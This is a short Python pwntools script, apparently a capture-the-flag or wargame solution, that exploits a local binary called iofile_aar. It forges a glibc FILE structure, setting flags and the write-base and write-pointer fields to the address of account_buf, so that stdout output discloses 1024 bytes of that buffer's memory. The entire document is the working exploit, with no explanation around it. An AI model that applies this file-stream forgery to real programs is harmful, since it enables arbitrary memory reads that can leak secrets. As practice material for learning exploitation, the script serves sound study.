# Name: iofile_aar.py

from pwn import *
p = process("./iofile_aar")
elf = ELF('./iofile_aar')

context.log_level = 'debug'

account_buf = elf.symbols['account_buf']

payload = p64(0xfbad0000 | 0x800)
payload += p64(0) # _IO_read_ptr
payload += p64(account_buf) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(account_buf) # _IO_write_base 
payload += p64(account_buf + 1024) # _IO_write_ptr 
payload += p64(0) # _IO_write_end 
payload += p64(0) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) 
payload += p64(1) # stdout

p.sendlineafter("Data: ", str(payload))
p.interactive()

